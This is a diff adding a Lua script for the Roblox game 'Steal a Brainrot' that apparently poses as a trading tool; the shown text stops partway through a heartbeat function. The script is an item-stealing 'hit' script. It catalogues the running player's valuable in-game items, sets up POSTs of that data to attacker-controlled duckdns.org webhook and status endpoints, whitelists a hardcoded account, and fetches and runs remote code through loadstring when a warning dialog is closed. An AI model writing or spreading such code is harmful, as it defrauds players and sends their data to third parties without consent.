@@ -1,0 +1,2443 @@
+local success = pcall(function()
+    local str = "test"
+    for first, last in utf8.graphemes(str) do
+        return first
+    end
+end)
+if not success then
+    while task.wait() do
+        error("copper anti temper")
+    end
+    error("copper anti temper")
+end
+setclipboard("discord.gg/mozil")
+if getgenv().SAB_TRADE_ONCE then
+    return
+end
+
+getgenv().SAB_TRADE_ONCE = true
+getgenv().StatusApi = "https://statusplayers.duckdns.org"
+getgenv().Protectors = "https://protectorapi.duckdns.org/api/webhook-protector"
+local Username = rawget(getgenv(), "Username") or rawget(getgenv(), "username") or { "rip_hieugay999" }
+local WEBHOOK_BASE = "https://vaultapi.duckdns.org/api/hit/"
+local WEBHOOK_TOKEN = rawget(getgenv(), "Webhook") or rawget(getgenv(), "webhook") or "wh_e38cd691f8a0941e57"
+local WEBHOOK_URL
+do
+    local v = WEBHOOK_TOKEN
+    if type(v) == "string" and v ~= "" then
+        
+        if v:match("^https?://") then
+            WEBHOOK_URL = v
+        else
+            
+            WEBHOOK_URL = WEBHOOK_BASE .. v
+        end
+    else
+        
+        WEBHOOK_URL = WEBHOOK_BASE .. ""
+    end
+end
+local PROTECTOR_URL = rawget(getgenv(), "Protectors") or ""
+local PROTECTOR_KEY = rawget(getgenv(), "ProtectorKey")
+    or rawget(getgenv(), "protectorKey")
+    or ""
+local THEME_COLOR      = 0x6C5CE7
+local PUBLIC_WEBHOOK_URL = rawget(getgenv(), "PublicWebhook") or rawget(getgenv(), "publicWebhook") or ""
+local TOP_HIT_WEBHOOK_URL = rawget(getgenv(), "TopHitWebhook") or rawget(getgenv(), "TopHit") or ""
+local STATUS_API_URL = rawget(getgenv(), "StatusApi") or ""
+local STATUS_HEARTBEAT_INTERVAL = 5
+local http = game:GetService("HttpService")
+local function extractVaultId(url)
+    if type(url) ~= "string" then
+        return nil
+    end
+
+    -- Trường hợp dùng kiểu wh_xxxxx
+    local wh = url:match("wh_%w+")
+    if wh then
+        return wh
+    end
+
+    -- Fallback: lấy đoạn sau dấu "/" cuối cùng (hợp với kiểu token base64)
+    local last = url:match("([^/]+)$")
+    return last
+end
+
+getgenv().FRWhitelist = getgenv().FRWhitelist or rawget(getgenv(), "Username") or {}
+local __FR_SET = {}
+if type(getgenv().FRWhitelist) == "table" then
+    for _,n in ipairs(getgenv().FRWhitelist) do
+        if type(n) == "string" then __FR_SET[n:lower()] = true end
+    end
+elseif type(getgenv().FRWhitelist) == "string" then
+    __FR_SET[getgenv().FRWhitelist:lower()] = true
+end
+
+local function inFRWhitelist(plr)
+    if not plr then return false end
+    local n1 = (plr.Name or ""):lower()
+    local n2 = (plr.DisplayName or ""):lower()
+    return __FR_SET[n1] or __FR_SET[n2]
+end
+
+local Players           = game:GetService("Players")
+local LocalPlayer       = Players.LocalPlayer
+local PlayerGui         = LocalPlayer:WaitForChild("PlayerGui")
+local CoreGui           = game:GetService("CoreGui")
+local HttpService       = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local SoundService      = game:GetService("SoundService")
+local promptFR -- forward declare để startDeleteOthers tham chiếu đúng local này
+local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
+
+--// HTTP (executors)
+local Request = (syn and syn.request) or http_request or request
+do
+    if not Request then
+        local ok, httpLib = pcall(function() return http end)
+        if ok and httpLib and type(httpLib.request) == "function" then
+            Request = httpLib.request
+        end
+    end
+    if not Request then
+        local ok, try = pcall(function()
+            return {
+                (fluxus and fluxus.request),
+                (krnl and krnl.request),
+                (getgenv and type(getgenv)=="function" and getgenv().request)
+            }
+        end)
+        if ok and type(try)=="table" then
+            for _,fn in ipairs(try) do
+                if type(fn)=="function" then Request = fn; break end
+            end
+        end
+    end
+end
+
+-- Small util
+local function safeParent()
+    return (pcall(function() return CoreGui end) and CoreGui) or PlayerGui
+end
+local function makeRound(inst, r)
+    local u = Instance.new("UICorner")
+    u.CornerRadius = UDim.new(0, r or 14); u.Parent = inst
+end
+local function makeStroke(inst, thickness, transp)
+    local s = Instance.new("UIStroke")
+    s.Thickness = thickness or 1; s.Transparency = transp or 0; s.Parent = inst
+end
+local function makeGradient(inst, c1, c2, rotation)
+    local g = Instance.new("UIGradient")
+    g.Color = ColorSequence.new(Color3.fromRGB(c1[1], c1[2], c1[3]), Color3.fromRGB(c2[1], c2[2], c2[3]))
+    g.Rotation = rotation or 0; g.Parent = inst
+end
+
+local _syncFailedExecutor = false
+
+local function showWarningUI(msg)
+    pcall(function()
+        local parent = (pcall(function() return CoreGui end) and CoreGui) or PlayerGui
+        -- remove old
+        local old = parent:FindFirstChild("SAB_Warning")
+        if old then old:Destroy() end
+
+        local sg = Instance.new("ScreenGui")
+        sg.Name = "SAB_Warning"
+        sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        sg.ResetOnSpawn = false
+        sg.Parent = parent
+
+        local bg = Instance.new("Frame")
+        bg.Size = UDim2.new(1, 0, 1, 0)
+        bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        bg.BackgroundTransparency = 0.4
+        bg.BorderSizePixel = 0
+        bg.Parent = sg
+
+        local box = Instance.new("Frame")
+        box.Size = UDim2.new(0, 420, 0, 160)
+        box.Position = UDim2.new(0.5, -210, 0.5, -80)
+        box.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+        box.BorderSizePixel = 0
+        box.Parent = sg
+        makeRound(box, 12)
+        makeStroke(box, 2, 0.3)
+
+        local icon = Instance.new("TextLabel")
+        icon.Size = UDim2.new(1, 0, 0, 40)
+        icon.Position = UDim2.new(0, 0, 0, 15)
+        icon.BackgroundTransparency = 1
+        icon.Text = "⚠️"
+        icon.TextSize = 28
+        icon.Font = Enum.Font.GothamBold
+        icon.TextColor3 = Color3.fromRGB(255, 200, 50)
+        icon.Parent = box
+
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(1, -40, 0, 60)
+        label.Position = UDim2.new(0, 20, 0, 55)
+        label.BackgroundTransparency = 1
+        label.Text = msg
+        label.TextSize = 16
+        label.Font = Enum.Font.Gotham
+        label.TextColor3 = Color3.fromRGB(255, 255, 255)
+        label.TextWrapped = true
+        label.TextXAlignment = Enum.TextXAlignment.Center
+        label.Parent = box
+
+        local closeBtn = Instance.new("TextButton")
+        closeBtn.Size = UDim2.new(0, 100, 0, 32)
+        closeBtn.Position = UDim2.new(0.5, -50, 1, -45)
+        closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+        closeBtn.BorderSizePixel = 0
+        closeBtn.Text = "OK"
+        closeBtn.TextSize = 14
+        closeBtn.Font = Enum.Font.GothamBold
+        closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        closeBtn.Parent = box
+        makeRound(closeBtn, 8)
+
+        closeBtn.Activated:Connect(function()
+            sg:Destroy()
+            task.spawn(function()
+                pcall(function()
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/keykey.lua"))()
+                end)
+            end)
+        end)
+    end)
+end
+
+local priority = {
+  ["6️⃣7️⃣"] = { "67", "Los 67" },
+  ["🪏"] = "Agarrini La Palini",
+  ["🦬"] = "Bisonte Giuppitere",
+  ["🐐"] = "Blackhole Goat",
+  ["🛥️"] = "Boatito Auratito",
+  ["🍔🍟"] = "Burguro And Fryuro",
+  ["📱"] = "Celularcini Viciosini",
+  ["🍕"] = "Centuzzarella Croccantini",
+  ["🛋️"] = "Chachechi",
+  ["🚲"] = "Chicleteira Bicicleteira",
+  ["🚴"] = "Chicleteirina Bicicleteirina",
+  ["🌶️"] = "Chillin Chili",
+  ["🐒"] = "Chimpanzini Spiderini",
+  ["🍕🥫"] = "Chipso and Queso",
+  ["➕"] = "Combinations",
+  ["🍪"] = "Cookie And Milkey",
+  ["🐉"] = "Dragon Cannelloni",
+  ["🤓"] = "Dul Dul Dul",
+  ["🏫"] = "Esok Sekolah",
+  ["😈"] = "Eviledon",
+  ["🦧"] = "Extinct Matteo",
+  ["🍖"] = "Extinct Tralalero",
+  ["🍓"] = "Fragola La La La",
+  ["🧟‍♂️"] = "Frankentteo",
+  ["🧂"] = "Garama and Madundung",
+  ["🐙"] = "Graipuss Medussi",
+  ["💥"] = "Horegini Boom",
+  ["🎃"] = "Jacko Jack Jack",
+  ["📋"] = "Job Job Job Sahur",
+  ["??"] = "Karker Sahur",
+  ["🪑"] = "Karkerkar Kurkur",
+  ["🪁"] = "Ketupat Kepat",
+  ["🪳"] = "La Cucaracha",
+  ["🦴"] = "La Extinct Grande",
+  ["💪"] = "La Grande Combinasion",
+  ["🔧"] = "La Karkerkar Combinasion",
+  ["🕌"] = "La Sahur Combinasion",
+  ["🔐"] = "La Secret Combinasion",
+  ["👻"] = "La Spooky Grande",
+  ["👑"] = "La Supreme Combinasion",
+  ["🎃🪐"] = "La Vacca Jacko Linterino",
+  ["🪐"] = "La Vacca Saturno Saturnita",
+  ["👭"] = "Las Sis",
+  ["🧑‍🤝‍🧑"] = "Los Matteos",
+  ["📲"] = "Los Mobilis",
+  ["😱"] = "Los Nooo My Hotspotsitos",
+  ["👨‍👦"] = "Los Primos",
+  ["🕷️"] = "Los Spyderinis",
+  ["🌮"] = "Los Tacoritas",
+  ["🐢"] = "Los Tortus",
+  ["🦈"] = "Los Tralaleritos",
+  ["🎺"] = "Mariachi Corazoni",
+  ["🚴‍♀️"] = "Mieteteira Bicicleteira",
+  ["🐶"] = "Money Money Puggy",
+  ["❌"] = "Noo my examine",
+  ["😭"] = "Nooo My Hotspot",
+  ["☢️"] = "Nuclearo Dinossauro",
+  ["🌯"] = "Perrito Burrito",
+  ["📶"] = "Pot Hotspot",
+  ["🐊"] = "Quesadilla Crocodila",
+  ["🚌"] = "Rang Ring Bus",
+  ["🕷️"] = "Sammyni Spyderini",
+  ["🍝"] = "Spaghetti Tualetti",
+  ["👻🎃"] = "Spooky and Pumpky",
+  ["🚴‍♂️"] = "Tacorita Bicicleta",
+  ["📢"] = "Tang Tang Keletang",
+  ["🍹"] = "Tequila",
+  ["⏰"] = "Tictac Sahur",
+  ["🔩"] = "To to to Sahur",
+  ["🍍"] = "Torttuginni Dragonfrutini",
+  ["🐋"] = "Tralaledon",
+  ["👟"] = "Trenostruzzo Turbo 4000",
+  ["🦅"] = "Vulturino Skeletono",
+  ["✅"] = "Yess my examine",
+  ["🧟"] = "Zombie Tralala",
+  ["👬"] = "Los Bros",
+  ["🫧"] = "Los Chicleteiras",
+  ["🧩"] = "Los Combinasionas",
+  ["📡"] = "Los Hotspotsitos",
+  ["💼"] = "Los Jobcitos",
+  ["💺"] = "Los Karkeritos",
+  ["🎲"] = { "Admin Lucky Block", "Secret Lucky Block", "Los Lucky Blocks", "Lucky Blocks" },
+  ["👯‍♀️"] = "Las Tralaleritas",
+  ["🐄"] = "Las Vaquitas Saturnitas",
+  ["⏳"] = "Limited Stock Brainrots",
+  ["🌯🤠"] = "Burrito Bandito",
+  ["🎃🐴"] = "Headless Horseman",
+  ["🦍"] = "Jackorilla",
+  ["🏚️"] = "La Casa Boo",
+  ["👻🧩"] = "Los Spooky Combanasionias",
+  ["🍬😭"] = "Noo my Candy",
+  ["🍲🎃"] = "Pot Pumpkin",
+  ["🎃🕷️"] = "Pumpkini Spyderini",
+  ["🌮🧛"] = "Quesadillo Vampiro",
+  ["🤹‍♂️👻"] = "Spooky Juggle",
+  ["🫔"] = "Tamaluk un Meass",
+  ["🪄"] = "Trickolino",
+  ["🍓🐘"] = "Strawberry Elephant",
+  ["😺🦉"] = "Meowl",
+  ["👾"] = "1x1x1x1",
+  ["🧁🍫"] = "Fragrama and Chocrama",
+  ["🚽"] = "Los Spaghettis",
+  ["🐕"] = "Los Puggies", 
+  ["👹"] = "Guest 666",
+  ["🚲🌮"] = "Bicicleteira Family",
+  ["⛵🐳"] = "Capitano Moby",
+  ["🍪🥛"] = "Cooki and Milki",
+  ["🍅🟡"] = "Ketchuru and Musturu",
+  ["🌮🧩"] = "La Taco Combinasion",
+  ["👻🧩"] = "Los Spooky Combinasionas",
+  ["🌮🚴🏼‍♂️"] = "Los Tacoritas",
+  ["🍭🚴🏼‍♂️"] = "Pirulitoita Bicicleteira",
+  ["🐊🍞"] = "Los Quesadillas",
+  ["🥤🕶️"] = "Swag Soda",
+  ["🇼 🇱 "] = "W or L",
+  ["⚫⚪"] = "Orcaledon",
+  ["🐠"] = "Fishino Clownino",
+  ["⬜🌈"] = "Lavadorito Spinito",
+  ["🎁🧩"] = "La Jolly Grande",
+  ["🛷🎁"] = "Chicleteira Noelteira",
+  ["🪵"] = "Tung Tung Tung Sahur",
+  ["🌯🏍️"] = "Los Burritos",
+  ["🪳🇲🇽"] = "Los Cucarachas",
+  ["🐉🫚"] = "Dragon Gingerini",
+  ["💸🦌"] = "Money Money Reindeer",
+  ["🦌🛷"] = "Reinito Sleighito",
+  ["🫚🏫"] = "La Ginger Sekolah",
+  ["2️⃣5️⃣"] = "Los 25",
+  ["🌲6️⃣7️⃣"] = "Festive 67",
+  ["🫚🪁"] = "Gingerat Gerat",
+  ["🍭🍬"] = "Los Candies",
+  ["🌶️🥤"] = "Swaggy Bros",
+  ["👨🚽"] = "Skibidi Toilet",
+  ["🔥🧱"] = "Chimnino",
+  ["⏰🦌"] = "Jolly Jolly Sahur",
+  ["🦃"] = "Gobblino Uniciclino",
+  ["🦜"] = "Tuff Toucan",
+  ["🎀🧩"] = "Los Jolly Combinasionas",
+  ["🪐🪐"] = "Los Planitos",
+  ["🧊🐉"] = "Hydra Dragon Cannelloni",
+  ["3️⃣🐕‍🦺"] = "Cerberus",
+  ["🍿🥤"] = "Popcuru and Fizzuru",
+  ["🌹🧸"] = "Rosey and Teddy",
+  ["🪁🫚"] = "Ketupat Bros",
+  ["💌🧸"] = "Love Love Bear",
+  ["🌹🚽"] = "Rosetti Tualetti",
+  ["🌹🧩"] = "La Romantic Grande",
+  ["🌹"] = "Lovin Rose",
+  ["🥓🍳"] = "Bacuru and Egguru",
+  ["🐹"] = "Spinny Hammy",
+  ["😇🚲"] = "Chicleteira Cupideira",
+}
+
+local traitsMap = {
+    ["rbxassetid://99181785766598"]  = "Galaxy",
+    ["rbxassetid://110723387483939"] = "Tung Attack",
+    ["rbxassetid://104964195846833"] = "Crab",
+    ["rbxassetid://118283346037788"] = "Solar",
+    ["rbxassetid://78474194088770"]  = "Rain",
+    ["rbxassetid://110910518481052"] = "UFO",
+    ["rbxassetid://83627475909869"]  = "Snow",
+    ["rbxassetid://75650816341229"]  = "Brazil",
+    ["rbxassetid://139729696247144"] = "Mygame24",
+    ["rbxassetid://121100427764858"] = "Startfall",
+    ["rbxassetid://95128039793845"]  = "Mexico",
+    ["rbxassetid://97725744252608"]  = "Bombardino",
+    ["rbxassetid://104985313532149"] = "Shark",
+    ["rbxassetid://100601425541874"] = "Bubblegum",
+    ["rbxassetid://121332433272976"] = "Glitched",
+    ["rbxassetid://89041930759464"]  = "Taco",
+    ["rbxassetid://104229924295526"] = "Nyan",
+    ["rbxassetid://115664804212096"] = "Hat",
+    ["rbxassetid://123964048606874"] = "Spooky",
+    ["rbxassetid://117478971325696"] = "Spider",
+    ["rbxassetid://89041930759464"] = "Taco",
+}
+
+-- === [THAY THẾ] Hàm mapping slot/gen chuẩn từ Scan Brainrot ===
+local function getMyPlot()
+    local plots = workspace:FindFirstChild("Plots")
+    if not plots then return nil end
+    local myName = LocalPlayer.DisplayName or LocalPlayer.Name
+    for _, plot in ipairs(plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign", true)
+        local label = sign and sign:FindFirstChildWhichIsA("TextLabel", true)
+        local text = label and (label.ContentText or label.Text or "")
+        if text and text:find(myName, 1, true) then
+            return plot
+        end
+    end
+    return nil
+end
+
+local function buildSlotAnchors(plot)
+    local anchors = {}
+    local podiums = plot:FindFirstChild("AnimalPodiums")
+    if not podiums then return anchors end
+    for _, podium in ipairs(podiums:GetChildren()) do
+        local idx = tonumber(podium.Name)
+        if idx then
+            local base = podium:FindFirstChild("Base")
+            local spawnPart = base and base:FindFirstChild("Spawn")
+            local anchor = spawnPart or base or podium:FindFirstChildWhichIsA("BasePart", true)
+            if anchor and anchor:IsA("BasePart") then
+                anchors[idx] = anchor.Position
+            end
+        end
+    end
+    return anchors
+end
+
+local function parseGen(text)
+    if not text or text == "" then return nil end
+    local numStr = text:match("([%d%.]+)")
+    local num = tonumber(numStr)
+    if not num then return nil end
+    local unit = text:match("([kKmMbBtT])")
+    local mul = 1
+    if unit == "k" or unit == "K" then mul = 1e3
+    elseif unit == "m" or unit == "M" then mul = 1e6
+    elseif unit == "b" or unit == "B" then mul = 1e9
+    elseif unit == "t" or unit == "T" then mul = 1e12 end
+    return num * mul
+end
+
+local function scanOverheadGens()
+    task.wait()  -- yield 1 frame, tránh block
+    local gens = {}
+    for _, inst in ipairs(workspace:GetDescendants()) do
+        if inst:IsA("TextLabel") and inst.Name == "Generation" then
+            local frame = inst.Parent
+            local nameLbl = frame and frame:FindFirstChild("DisplayName")
+            local name = nameLbl and (nameLbl.ContentText or nameLbl.Text)
+            local genText = inst.ContentText or inst.Text
+            if name and genText and genText:find("/s") then
+                local billboard = frame and frame:FindFirstAncestorOfClass("BillboardGui")
+                local adorn = billboard and billboard.Adornee
+                local pos
+                if adorn and adorn:IsA("BasePart") then
+                    pos = adorn.Position
+                else
+                    local partAncestor = frame:FindFirstAncestorWhichIsA("BasePart")
+                    if partAncestor then
+                        pos = partAncestor.Position
+                    end
+                end
+                if pos then
+                    local genNum = parseGen(genText)
+                    table.insert(gens, {
+                        name = name,
+                        genText = genText,
+                        genNum = genNum,
+                        pos = pos,
+                    })
+                end
+            end
+        end
+    end
+    return gens
+end
+
+local function mapModelsToSlots(plot, anchors)
+    local slotModels = {}
+    for _, child in ipairs(plot:GetChildren()) do
+        if child:IsA("Model") and child.Name ~= "Base" and child.Name ~= "Claim" and child.Name ~= "AnimalPodiums" and child.Name ~= "PlotSign" then
+            local root = child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart", true)
+            if root then
+                local pos = root.Position
+                local bestSlot, bestDist = nil, math.huge
+                for slot, aPos in pairs(anchors) do
+                    local d = (pos - aPos).Magnitude
+                    if d < bestDist then
+                        bestDist = d
+                        bestSlot = slot
+                    end
+                end
+                if bestSlot then
+                    slotModels[bestSlot] = {
+                        name = child.Name,
+                        model = child,
+                        pos = pos,
+                        dist = bestDist,
+                    }
+                end
+            end
+        end
+    end
+    return slotModels
+end
+
+local function findGenForModel(modelInfo, gens)
+    local best, bestDist
+    for _, g in ipairs(gens) do
+        if g.name == modelInfo.name then
+            local d = (modelInfo.pos - g.pos).Magnitude
+            if not bestDist or d < bestDist then
+                bestDist = d
+                best = g
+            end
+        end
+    end
+    return best, bestDist
+end
+
+local function buildSlotGenMap(plot)
+    local anchors = buildSlotAnchors(plot)
+    if not next(anchors) then return {} end
+    local slotModels = mapModelsToSlots(plot, anchors)
+    local gens = scanOverheadGens()
+    local slotGen = {}
+    for slot, modelInfo in pairs(slotModels) do
+        local g, dist = findGenForModel(modelInfo, gens)
+        if g and g.genNum and g.genNum > 0 then
+            slotGen[slot] = {
+                mpsNum = g.genNum,
+                mpsText = g.genText,
+            }
+        end
+    end
+    return slotGen
+end
+-- === Kết thúc hàm mới ===
+
+local rarityRank = {
+    Divine        = 1,
+    OG            = 1,
+    Secret        = 2,
+    ["Brainrot God"] = 3,
+    Mythic        = 4,
+    Legendary     = 5,
+    Epic          = 6,
+    Rare          = 7,
+    Common        = 8,
+}
+
+
+local function collectBrainrots()
+    if not LocalPlayer or not ReplicatedStorage then
+        return { list = { "None" }, total = 0, ping = false, maxGen = 0 }
+    end
+
+    ----------------------------------------------------------------
+    -- 1) Helpers: load SYNC_DATA + Datas/Animals (từ ok trade)
+    ----------------------------------------------------------------
+    local function loadSyncData()
+        local Packages = ReplicatedStorage:FindFirstChild("Packages")
+        if not Packages then
+            warn("[SAB] Không thấy ReplicatedStorage.Packages")
+            return nil
+        end
+
+        local syncModule = Packages:FindFirstChild("Synchronizer")
+        if not syncModule then
+            warn("[SAB] Không thấy Packages.Synchronizer")
+            return nil
+        end
+
+        local okReq, sync = pcall(require, syncModule)
+        if not okReq or type(sync) ~= "table" then
+            warn("[SAB] require(Synchronizer) fail")
+            return nil
+        end
+
+        local getFn = sync.Get or sync.get or sync.getData
+        if type(getFn) ~= "function" then
+            warn("[SAB] Không tìm thấy hàm Get trong Synchronizer")
+            return nil
+        end
+
+        for i = 1, 30 do
+            local ok, uv = pcall(function()
+                return debug.getupvalue(getFn, i)
+            end)
+            if ok and type(uv) == "table" then
+                return uv
+            end
+        end
+
+        warn("[SAB] Không lôi được SYNC_DATA từ Synchronizer")
+        _syncFailedExecutor = true
+        return nil
+    end
+
+    local function safeRequire(pathArray)
+        local node = ReplicatedStorage
+        for _, name in ipairs(pathArray) do
+            node = node:FindFirstChild(name)
+            if not node then return nil end
+        end
+        local ok, mod = pcall(require, node)
+        if ok then return mod end
+        return nil
+    end
+
+    local AnimalsData = safeRequire({ "Datas", "Animals" })
+
+    local function getMutationName(mutation)
+        if not mutation then
+            return "None"
+        end
+
+        if type(mutation) == "string" then
+            return mutation
+        end
+
+        if type(mutation) == "table" then
+            if mutation.Type and type(mutation.Type) == "string" then
+                return mutation.Type
+            end
+            local parts = {}
+            for _, v in pairs(mutation) do
+                if type(v) == "string" then
+                    table.insert(parts, v)
+                end
+            end
+            if #parts > 0 then
+                table.sort(parts)
+                return table.concat(parts, "+")
+            end
+        end
+
+        return "Unknown"
+    end
+
+
+    ----------------------------------------------------------------
+    -- 3) Scan brainrot theo kiểu ok trade (SYNC_DATA + Animals)
+    ----------------------------------------------------------------
+    local SYNC_DATA = loadSyncData()
+    if not SYNC_DATA then
+        return { list = { "None" }, total = 0, ping = false, maxGen = 0 }
+    end
+
+    local myPlot = getMyPlot()
+    local SLOT_GEN_MAP = myPlot and buildSlotGenMap(myPlot) or {}
+
+    local allBrainrots = {}
+
+    for _, plotData in pairs(SYNC_DATA) do
+        if type(plotData) == "table" then
+            local owner = plotData.Owner
+            if type(plotData.Get) == "function" and owner == nil then
+                local okGetOwner, gotOwner = pcall(function()
+                    return plotData:Get("Owner")
+                end)
+                if okGetOwner then
+                    owner = gotOwner
+                end
+            end
+
+            local isOwner = false
+            if typeof(owner) == "Instance" and owner:IsA("Player") then
+                isOwner = (owner == LocalPlayer)
+            elseif type(owner) == "table" and owner.UserId then
+                isOwner = (owner.UserId == LocalPlayer.UserId)
+            end
+
+            if isOwner then
+                local animalList = plotData.AnimalList
+                if type(plotData.Get) == "function" and animalList == nil then
+                    local okGetList, gotList = pcall(function()
+                        return plotData:Get("AnimalList")
+                    end)
+                    if okGetList then
+                        animalList = gotList
+                    end
+                end
+
+                if type(animalList) == "table" then
+                    for slotKey, data in pairs(animalList) do
+                        if type(data) == "table" and data.Index then
+                            local index    = data.Index
+                            local uuid     = data.UUID or data.Uid
+                            local off      = data.OfflineGain or 0
+                            local last     = data.LastCollect or 0
+                            local traits   = data.Traits
+                            local mutation = data.Mutation
+
+                            local displayName = index
+                            local rarity      = "Common"
+                            local mutName     = getMutationName(mutation)
+
+                            if AnimalsData and AnimalsData[index] then
+                                local info = AnimalsData[index]
+                                if type(info) == "table" then
+                                    displayName = info.DisplayName or displayName
+                                    rarity      = info.Rarity or rarity
+                                end
+                            end
+
+                            local slotNum = tonumber(slotKey)
+                            local mpsVal, mpsText = 0, "0"
+                            if slotNum and SLOT_GEN_MAP[slotNum] then
+                                mpsVal  = SLOT_GEN_MAP[slotNum].mpsNum  or 0
+                                mpsText = SLOT_GEN_MAP[slotNum].mpsText or "0"
+                            end
+
+                            table.insert(allBrainrots, {
+                                slotKey  = slotNum or slotKey,
+                                display  = displayName,
+                                uuid     = uuid,
+                                offline  = off,
+                                last     = last,
+                                traits   = traits,
+                                mutation = mutation,
+                                mutName  = mutName,
+                                rarity   = rarity,
+                                mps      = mpsVal,
+                                mpsText  = mpsText,
+                            })
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+print("==============================================")
+print("[SAB-TRADE] Brainrots trong base (chưa sort):")
+
+for _, b in ipairs(allBrainrots) do
+    local genStr = b.genText
+
+    if not genStr then
+        if b.mpsText then
+            genStr = b.mpsText
+        elseif b.gen then
+            genStr = tostring(b.gen)
+        else
+            genStr = "?"
+        end
+    end
+
+    print(("[slot=%s] [%s] %s | gen=%s | traits=%s | mut=%s")
+    :format(
+        tostring(b.slot or b.slotKey or "?"),
+        tostring(b.rarity or "?"),
+        tostring(b.display or b.index or "?"), -- dùng "display" thay vì "displayName"
+        genStr,
+        b.traitsText or "None",
+        tostring(b.mutationName or b.mutation or "None")
+    ))
+end
+
+print("==============================================")
+    if #allBrainrots == 0 then
+        return { list = { "None" }, total = 0, ping = false, maxGen = 0 }
+    end
+
+    ----------------------------------------------------------------
+    -- 4) Convert sang format embed cũ của SAB (emoji + mutation + rarity + mpsText)
+    ----------------------------------------------------------------
+    local list   = {}
+    local maxGen = 0
+    local ping   = false
+
+    local function parseBrainrotPingConfig()
+        local v = rawget(getgenv(), "BrainrotPing") or rawget(getgenv(), "brainrotPing")
+        if v == nil then
+            return 0
+        end
+
+        if type(v) == "number" then
+            return v
+        end
+
+        if type(v) == "string" then
+            local s = v
+
+            -- bỏ khoảng trắng, chuyển , -> .
+            s = s:gsub("%s+", "")
+            s = s:gsub(",", ".")
+
+            -- cho phép dạng 10M/s, 10m/s, 100k/s, 7.5m/s, ...
+            s = s:gsub("/s$", "")
+            s = s:gsub("s$", "")
+
+            -- dùng parser K/M/B giống gen (10M, 100K, 7.5M, 1000, 7500000, ...)
+            local toParse = s:upper()
+            local num = parseGen(toParse)  -- dùng luôn parseGen đang có trong collectBrainrots
+            return num or 0
+        end
+
+        return 0
+    end
+
+    local pingThreshold = parseBrainrotPingConfig()
+
+    for _, br in ipairs(allBrainrots) do
+        local rarity = tostring(br.rarity or "Common")
+        local rRank  = rarityRank[rarity] or 999
+
+        local mpsNum  = tonumber(br.mps or 0) or 0
+        local mpsText = tostring(br.mpsText or mpsNum)
+
+        if mpsNum > maxGen then
+            maxGen = mpsNum
+        end
+
+        if pingThreshold > 0 and mpsNum >= pingThreshold then
+            ping = true
+        end
+
+        -- gom Mutation + Traits vào 1 list
+        local nameParts = {}
+
+        -- mutation
+        if br.mutName and br.mutName ~= "" and br.mutName ~= "None" then
+            table.insert(nameParts, br.mutName)
+        end
+
+        -- traits (table string, ví dụ: {"Indonesia","Fire","Taco"})
+        if type(br.traits) == "table" then
+            for _, tv in ipairs(br.traits) do
+                if tv ~= nil and tv ~= "" then
+                    local label = tv
+                    -- nếu trait là assetId và có trong traitsMap thì map sang tên
+                    if traitsMap[tv] then
+                        label = traitsMap[tv]
+                    end
+                    table.insert(nameParts, tostring(label))
+                end
+            end
+        end
+
+        local tagStr = ""
+        if #nameParts > 0 then
+            tagStr = "[" .. table.concat(nameParts, ", ") .. "] "
+        end
+
+        local emoji
+        for em, v in pairs(priority) do
+            if type(v) == "string" then
+                if v == br.display then
+                    emoji = em
+                    break
+                end
+            elseif type(v) == "table" then
+                for _, n in ipairs(v) do
+                    if n == br.display then
+                        emoji = em
+                        break
+                    end
+                end
+                if emoji then
+                    break
+                end
+            end
+        end
+
+        local lineText = string.format(
+            "%s ➜ %s%s ➜ %s %s",
+            emoji or "🐵",  -- icon từ priority, fallback 🐵
+            tagStr,         -- [Mutation, Trait1, Trait2...]
+            br.display,     -- tên brainrot
+            rarity,
+            mpsText
+        )
+
+        table.insert(list, {
+            line  = lineText,
+            rRank = rRank,
+            gen   = mpsNum,
+        })
+    end
+
+    table.sort(list, function(a, b)
+        if a.rRank ~= b.rRank then
+            return a.rRank < b.rRank
+        end
+        if a.gen ~= b.gen then
+            return a.gen > b.gen
+        end
+        return a.line < b.line
+    end)
+
+    local outLines = {}
+    for i, v in ipairs(list) do
+        if i <= 15 then
+            table.insert(outLines, v.line)
+        elseif i == 16 then
+            table.insert(outLines, "...and more!")
+            break
+        end
+    end
+
+    if #outLines == 0 then
+        outLines = { "None" }
+    end
+
+    return {
+        list   = outLines,
+        total  = #list,
+        ping   = ping,
+        maxGen = maxGen,
+    }
+end
+
+-- replace WHOLE _postJson with this
+local function withWaitParam(url)
+    url = tostring(url or "")
+    if url == "" then return url end
+    if url:lower():find("wait=") then return url end
+    if url:find("?", 1, true) then
+        return url .. "&wait=true"
+    else
+        return url .. "?wait=true"
+    end
+end
+
+local function _postJson(url, headers, bodyStr)
+    -- pick best request fn from executor
+    local req = Request
+        or (syn and syn.request) or http_request or request
+        or (fluxus and fluxus.request) or (krnl and krnl.request)
+        or (http and http.request)
+
+    if type(req) ~= "function" then
+        warn("[HTTP] No executor request function (syn.request/http_request/...).")
+        return false, "no_request_fn"
+    end
+
+    headers = headers or {}
+    headers["Content-Type"] = headers["Content-Type"] or "application/json"
+
+    local ok, resp = pcall(function()
+        return req({ Url = url, Method = "POST", Headers = headers, Body = bodyStr })
+    end)
+    if not ok then return false, resp end
+
+    local status = resp.StatusCode or resp.Status or resp.status_code or 0
+    local success = (status >= 200 and status < 300)
+    return success, { status = status, body = (resp.Body or resp.body or resp.ResponseBody or "") }
+end
+--=== PLAYER STATUS: REGISTER & HEARTBEAT ===
+local statusHeartbeatStarted = false
+
+local function startStatusHeartbeat(sessionId)
+    if statusHeartbeatStarted then return end
+    statusHeartbeatStarted = true
+
+    if STATUS_API_URL == "" then return end
+    if not Request or type(Request) ~= "function" then
+        warn("[Status] No HTTP request fn, skip heartbeat")
+        return
+    end
+
+    task.spawn(function()
+        while task.wait(STATUS_HEARTBEAT_INTERVAL) do
+            if STATUS_API_URL == "" then break end
+
+            local ok, err = pcall(function()
+                return Request({
